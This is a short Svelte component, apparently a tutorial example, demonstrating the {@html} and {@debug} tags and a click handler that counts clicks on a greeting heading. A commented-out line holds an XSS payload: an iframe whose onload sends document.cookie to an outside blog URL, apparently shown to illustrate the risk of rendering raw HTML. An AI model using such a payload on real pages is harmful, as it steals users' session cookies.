<script>
    // let h1 = `<h1>Hello Heropy</h1>`;
    // let xss = "<iframe onload='document.location='https//heropy.blog?${document.cookie}'></iframe>";

    let name = 'pcy';
    let index = 0
</script>

<!-- {@html h1} -->

{@debug index, name}
<h1 on:click={() => {index += 1}}>Hello {name}</h1>